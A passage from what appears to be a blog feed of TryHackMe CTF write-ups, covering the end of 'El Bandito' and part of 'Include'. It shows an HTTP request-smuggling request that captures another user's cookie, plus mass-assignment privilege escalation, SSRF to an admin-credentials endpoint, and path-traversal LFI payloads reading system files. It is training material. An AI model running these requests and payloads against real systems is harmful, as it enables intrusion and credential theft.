+</span></span><span style="display:flex;"><span>X-Application-Context<span style="color:#89dceb;font-weight:bold">:</span> application:8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 
+</span></span><span style="display:flex;"><span>X-Application-Context: application:8081
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>Content-Length: 55
+</span></span><span style="display:flex;"><span>Date: Fri, 07 Mar 2025 21:15:49 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username:REDACTED password:REDACTED
+</span></span></code></pre></div></div>
+</div>
+<p><figure aria-label="Chat page with several loaded messages">
+  <img
+    alt="Chat page with several loaded messages"
+    title="Chat page with several loaded messages"width="1081"height="572"srcset="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_chat_hu_aff90124b7c1af1a.webp 1081w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_chat_hu_7a567263ced24fe1.webp 420w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_chat_hu_809edaeca49698a3.webp 789w, /articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_chat_hu_92681f9170ea2f3a.webp 1019w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/13/writeup-tryhackme-el-bandito/ctf_elbandito_chat_hu_339f888e8c8c2dfb.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>Having valid cookies I used <a href="https://github.com/PortSwigger/http-request-smuggler" class="external-link">HTTP Request Smuggler</a> Burp extension to confirm possibility of poisoning HTTP queue:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Found issue: CL.0 desync: h2CL|TRACE /
+</span></span><span style="display:flex;"><span>Target: https://10.10.192.13
+</span></span><span style="display:flex;"><span>HTTP Request Smuggler repeatedly issued the attached request. After 1 attempts, it got a response that appears to have been poisoned by the body of the previous request. For further details and information on remediation, please refer to https://portswigger.net/research/browser-powered-desync-attacks
+</span></span><span style="display:flex;"><span>Evidence: 
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><p>The extension found vulnerability using <code>Content-Length: 0</code> header (CL.0). I crafted a request to save next user request as a chat message:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">POST</span> <span style="color:#fab387">/send_message</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#89dceb;font-weight:bold">:</span> session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#89dceb;font-weight:bold">:</span> Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#89dceb;font-weight:bold">:</span> */*
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#89dceb;font-weight:bold">:</span> en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#89dceb;font-weight:bold">:</span> gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80/messages
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#89dceb;font-weight:bold">:</span> application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#89dceb;font-weight:bold">:</span> 0
+</span></span><span style="display:flex;"><span>Origin<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#89dceb;font-weight:bold">:</span> empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#89dceb;font-weight:bold">:</span> cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#89dceb;font-weight:bold">:</span> same-origin
+</span></span><span style="display:flex;"><span>Priority<span style="color:#89dceb;font-weight:bold">:</span> u=0
+</span></span><span style="display:flex;"><span>Te<span style="color:#89dceb;font-weight:bold">:</span> trailers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POST /send_message HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: 700
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data=
+</span></span></code></pre></div><p>After playing a bit with smuggled request&rsquo;s <code>Content-Size</code> I got a user request containing the second flag as a cookie value:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-4" id="tabs-4-0" checked="checked" />
+<label for="tabs-4-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/getMessages</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#89dceb;font-weight:bold">:</span> session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#89dceb;font-weight:bold">:</span> Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#89dceb;font-weight:bold">:</span> */*
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#89dceb;font-weight:bold">:</span> en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#89dceb;font-weight:bold">:</span> gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80/messages
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#89dceb;font-weight:bold">:</span> empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#89dceb;font-weight:bold">:</span> cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#89dceb;font-weight:bold">:</span> same-origin
+</span></span><span style="display:flex;"><span>Priority<span style="color:#89dceb;font-weight:bold">:</span> u=4
+</span></span><span style="display:flex;"><span>Te<span style="color:#89dceb;font-weight:bold">:</span> trailers
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-4" id="tabs-4-1"  />
+<label for="tabs-4-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span> <span style="color:#fab387">200</span> <span style="color:#fab387">OK</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 22:01:08 GMT
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#89dceb;font-weight:bold">:</span> application/json
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#89dceb;font-weight:bold">:</span> 2883
+</span></span><span style="display:flex;"><span>Content-Security-Policy<span style="color:#89dceb;font-weight:bold">:</span> default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;;
+</span></span><span style="display:flex;"><span>X-Content-Type-Options<span style="color:#89dceb;font-weight:bold">:</span> nosniff
+</span></span><span style="display:flex;"><span>X-Frame-Options<span style="color:#89dceb;font-weight:bold">:</span> SAMEORIGIN
+</span></span><span style="display:flex;"><span>X-Xss-Protection<span style="color:#89dceb;font-weight:bold">:</span> 1; mode=block
+</span></span><span style="display:flex;"><span>Feature-Policy<span style="color:#89dceb;font-weight:bold">:</span> microphone &#39;none&#39;; geolocation &#39;none&#39;;
+</span></span><span style="display:flex;"><span>Age<span style="color:#89dceb;font-weight:bold">:</span> 0
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> El Bandito Server
+</span></span><span style="display:flex;"><span>Accept-Ranges<span style="color:#89dceb;font-weight:bold">:</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#cba6f7">&#34;JACK&#34;</span>:[<span style="color:#a6e3a1">&#34;The Galactic Enforcement&#39;s quantum sniffers are onto us, tracing our blockchain exploits.&#34;</span>,<span style="color:#a6e3a1">&#34;They&#39;re using predictive analytics, thinking they&#39;re ahead in a 4D chess game across the blockchain.&#34;</span>,<span style="color:#a6e3a1">&#34;You need to jump now! Awaiting your signal to close the portal.&#34;</span>,<span style="color:#fab387">null</span>,<span style="color:#fab387">null</span>,<span style="color:#a6e3a1">&#34;njk&#34;</span>,<span style="color:#fab387">null</span>,<span style="color:#f38ba8">...SNIP...</span><span style="color:#a6e3a1">&#34;GET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: \&#34;Chromium\&#34;;v=\&#34;122\&#34;, \&#34;Not(A:Brand\&#34;;v=\&#34;24\&#34;, \&#34;HeadlessChrome\&#34;;v=\&#34;122\&#34;\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \&#34;Linux\&#34;\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{\u00a1!\u00a1REDACTED!\u00a1!}\r\nX-Forwa&#34;</span>,<span style="color:#fab387">null</span>],<span style="color:#cba6f7">&#34;OLIVER&#34;</span>:[]}
+</span></span></code></pre></div></div>
+</div>
+<div class="callout note" role="note"aria-label="Note">
+    <p>You might need to try several times. HTTP smuggling isn&rsquo;t precise and can cause service disruption: I had to reboot the machine because the server kept dying.</p>
+</div>
+]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Include</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/" hreflang="en"/>
+    <published>2025-03-05T16:35:52Z</published>
+    <updated>2025-03-05T16:35:52Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-03-05:/articles/2025/03/05/writeup-tryhackme-include/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/include" class="external-link">Include</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks.</p>
+<p>Even if it&rsquo;s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?</p>
+<p>Answer the questions below</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/include" class="external-link">Include</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks.</p>
+<p>Even if it&rsquo;s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?</p>
+<p>Answer the questions below</p>
+<ol>
+<li>What is the flag value after logging in to the SysMon app?</li>
+<li>What is the content of the hidden text file in <code>/var/www/html</code>?</li>
+</ol>
+</div>
+<p>This room acts as a final challenge for the advanced server-side attacks module. Vulnerabilities explored:</p>
+<ul>
+<li>Broken object property level authorization (BOPLA)</li>
+<li>Information disclosure</li>
+<li>SSRF</li>
+<li>LFI2RCE via log poisoning</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#privilege-escalation-via-mass-assignment-vulnerability">Privilege escalation via mass assignment vulnerability</a></li>
+    <li><a href="#getting-admin-credentials-via-ssrf">Getting admin credentials via SSRF</a></li>
+    <li><a href="#first-flag">First flag</a></li>
+    <li><a href="#lfi2rce-via-log-poisoning">LFI2RCE via log poisoning</a></li>
+    <li><a href="#second-flag">Second flag</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>I started with a port scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sS -vv -T4 MACHINE_IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE  REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh      syn-ack ttl <span style="color:#fab387">61</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>25/tcp    open  smtp     syn-ack ttl <span style="color:#fab387">61</span> Postfix smtpd
+</span></span><span style="display:flex;"><span>110/tcp   open  pop3     syn-ack ttl <span style="color:#fab387">61</span> Dovecot pop3d
+</span></span><span style="display:flex;"><span>143/tcp   open  imap     syn-ack ttl <span style="color:#fab387">61</span> Dovecot imapd <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>993/tcp   open  ssl/imap syn-ack ttl <span style="color:#fab387">61</span> Dovecot imapd <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>995/tcp   open  ssl/pop3 syn-ack ttl <span style="color:#fab387">61</span> Dovecot pop3d
+</span></span><span style="display:flex;"><span>4000/tcp  open  http     syn-ack ttl <span style="color:#fab387">61</span> Node.js <span style="color:#89dceb;font-weight:bold">(</span>Express middleware<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>50000/tcp open  http     syn-ack ttl <span style="color:#fab387">61</span> Apache httpd 2.4.41 <span style="color:#89dceb;font-weight:bold">((</span>Ubuntu<span style="color:#89dceb;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>There are lots of open ports: SSH, two web apps, and a mail server.</p>
+<p>The first web app running on port 5000 is a SysMon portal. We need to find a way into it to get the first flag.</p>
+<p><figure aria-label="Screenshot of SysMon app">
+  <img
+    alt="Screenshot of SysMon app"
+    title="Screenshot of SysMon app"width="769"height="301"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home_hu_64dbc7bf9e2fc74f.webp 769w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home_hu_e9e51ec0b087f81f.webp 420w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home_hu_6d68de0ac649905d.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>The second web app is running on port 4000.</p>
+<p><figure aria-label="Screenshot of review web app login page">
+  <img
+    alt="Screenshot of review web app login page"
+    title="Screenshot of review web app login page"width="769"height="723"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login_hu_3b6deb7aaccd6a64.webp 769w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login_hu_9c14b8681c5328dc.webp 420w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login_hu_943f243a30dd51c7.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>Here, I almost missed the big &ldquo;Sign In using guest/guest&rdquo; phrase.</p>
+<h2 id="privilege-escalation-via-mass-assignment-vulnerability" >
+  <a href="#privilege-escalation-via-mass-assignment-vulnerability">Privilege escalation via mass assignment vulnerability</a>
+</h2>
+<p>Logging in with guest credentials displays several profiles. Current user profile exposes a lot of properties which can be considered <a href="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" class="external-link">an excessive data exposure part of BOPLA</a> vulnerability. And there is a form which allows adding new properties.</p>
+<p><figure aria-label="Screenshot of user profile">
+  <img
+    alt="Screenshot of user profile"
+    title="Screenshot of user profile"width="910"height="874"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_hu_394e7d2ca9a0b982.webp 910w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_hu_4f0e56a77fbe4b59.webp 420w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_hu_338bdb55f5aed5e2.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_hu_1f17e8a4faa38302.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>The form is vulnerable to the BOPLA&rsquo;s mass assignment attack, so I used it to escalate current user privileges to the administrator by changing value of <code>isAdmin</code> property.</p>
+<p><figure aria-label="Screenshot of the form set to isAdmin and true values">
+  <img
+    alt="Screenshot of the form set to isAdmin and true values"
+    title="Screenshot of the form set to isAdmin and true values"width="910"height="268"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form_hu_d5de41c3ea3fd343.webp 910w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form_hu_639b7485c4c183d.webp 420w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form_hu_4352af4527040226.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form_hu_9c027a1cadb3d3d4.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<div class="callout note" role="note"aria-label="Note">
+    <p>Some writeups call this prototype pollution vulnerability, which is incorrect: we don&rsquo;t modify object prototype here.</p>
+</div>
+<h2 id="getting-admin-credentials-via-ssrf" >
+  <a href="#getting-admin-credentials-via-ssrf">Getting admin credentials via SSRF</a>
+</h2>
+<p>After successful privilege escalation, the page has two new links: &ldquo;API&rdquo; and &ldquo;Settings&rdquo;.</p>
+<p><figure aria-label="Screenshot of the page with new links">
+  <img
+    alt="Screenshot of the page with new links"
+    title="Screenshot of the page with new links"width="910"height="866"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin_hu_aeb11eb7641591cb.webp 910w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin_hu_c9061309f87bea6b.webp 420w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin_hu_9072d818f27e08e.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin_hu_4b421e6299a4f73f.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>On &ldquo;API&rdquo; page there is information about how to access internal APIs; one endpoint allows getting administrator credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>API Dashboard
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Below is a list of important APIs accessible to admins with sample requests and responses:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Internal API
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET http://127.0.0.1:5000/internal-api HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 127.0.0.1:5000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Response:
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    &#34;secretKey&#34;: &#34;superSecretKey123&#34;,
+</span></span><span style="display:flex;"><span>    &#34;confidentialInfo&#34;: &#34;This is very confidential.&#34;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Get Admins API
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 127.0.0.1:5000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Response:
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    &#34;ReviewAppUsername&#34;: &#34;admin&#34;,
+</span></span><span style="display:flex;"><span>    &#34;ReviewAppPassword&#34;: &#34;xxxxxx&#34;,
+</span></span><span style="display:flex;"><span>    &#34;SysMonAppUsername&#34;: &#34;administrator&#34;,
+</span></span><span style="display:flex;"><span>    &#34;SysMonAppPassword&#34;: &#34;xxxxxxxxx&#34;,
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>&ldquo;Settings&rdquo; page allows changing banner image by providing URL.</p>
+<p><figure aria-label="Screeenshot of Admin Settings page">
+  <img
+    alt="Screeenshot of Admin Settings page"
+    title="Screeenshot of Admin Settings page"width="823"height="416"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings_hu_7b54aedb3ae82108.webp 823w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings_hu_398bb50d0833efd7.webp 420w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings_hu_8127c87b5c6dd8da.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings_hu_3ce0638370a5118.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>This page is vulnerable to SSRF attack. Instead of image URL I provided credentials endpoint:</p>
+<p><figure aria-label="Screenshot of form set to credentials API url">
+  <img
+    alt="Screenshot of form set to credentials API url"
+    title="Screenshot of form set to credentials API url"width="405"height="164"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_banner_ssrf_hu_f013c9458c310f0b.webp 405w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_banner_ssrf_hu_91b0deacca773b6.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>The page includes the response in base64 encoded format:</p>
+<p><figure aria-label="Screenshot of the page displaying result of SSRF">
+  <img
+    alt="Screenshot of the page displaying result of SSRF"
+    title="Screenshot of the page displaying result of SSRF"width="823"height="479"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response_hu_d9f925e8c58ff873.webp 823w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response_hu_b4768e5ab8874357.webp 420w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response_hu_be2ebd3a86c3a5d3.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response_hu_5226fc81a4bbf5aa.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<p>I used CyberChef to decode it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0= 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{&#34;ReviewAppUsername&#34;:&#34;admin&#34;,&#34;ReviewAppPassword&#34;:&#34;REDACTED&#34;,&#34;SysMonAppUsername&#34;:&#34;administrator&#34;,&#34;SysMonAppPassword&#34;:&#34;REDACTED&#34;}
+</span></span></code></pre></div><h2 id="first-flag" >
+  <a href="#first-flag">First flag</a>
+</h2>
+<p>With these credentials I logged into SysMon app and got the first flag.</p>
+<p><figure aria-label="Screenshot of the dashboard with displayed flag">
+  <img
+    alt="Screenshot of the dashboard with displayed flag"
+    title="Screenshot of the dashboard with displayed flag"width="932"height="447"srcset="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard_hu_e00ce07c24fd5807.webp 932w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard_hu_fc712c1bbcf6acee.webp 420w, /articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard_hu_477b315ff7cd8b33.webp 789w, "
+        sizes="(min-width: 800px) 50vw, 100vw"
+        src="/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard_hu_b13cd17b250b5475.jpg"decoding="async"
+      loading="lazy"/></figure></p>
+<h2 id="lfi2rce-via-log-poisoning" >
+  <a href="#lfi2rce-via-log-poisoning">LFI2RCE via log poisoning</a>
+</h2>
+<p>Profile picture on the dashboard has a curious <code>src</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#cba6f7">img</span> <span style="color:#89b4fa">src</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#a6e3a1">&#34;profile.php?img=profile.png&#34;</span> <span style="color:#89b4fa">class</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#a6e3a1">&#34;img-fluid rounded-circle mb-3 profile-pic&#34;</span> <span style="color:#89b4fa">alt</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#a6e3a1">&#34;User Profile Picture&#34;</span>&gt;
+</span></span></code></pre></div><p>To check whether it is vulnerable to local file inclusion I used <code>ffuf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ ffuf -r -c -request req -request-proto &#39;http&#39; -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 100ms]
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 100ms]
+</span></span></code></pre></div><p>Since the second flag is found on the file system, I guessed I needed to achieve LFI2RCE. Initially, I unsuccessfully attempted Apache log poisoning.</p>
+<p>Remembering that there was a mail server, I tried <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/LFI-to-RCE/#rce-via-mail" class="external-link">mail log poisoning</a>. First, I confirmed that the file <code>/var/log/mail.log</code> can be accessed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>http:<span style="color:#89dceb;font-weight:bold">//</span>MACHINE_IP:<span style="color:#fab387">50000</span><span style="color:#89dceb;font-weight:bold">/</span>profile<span style="color:#89dceb;font-weight:bold">.</span>php<span style="color:#f38ba8">?</span>img<span style="color:#89dceb;font-weight:bold">=....//....//....//....//....//....//....//....//....//</span><span style="color:#cba6f7">var</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#89dceb">log</span><span style="color:#89dceb;font-weight:bold">/</span>mail<span style="color:#89dceb;font-weight:bold">.</span>log
+</span></span></code></pre></div><p>Next, to poison the log, I sent PHP code payload as an address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ telnet MACHINE_IP 25
+</span></span><span style="display:flex;"><span>...
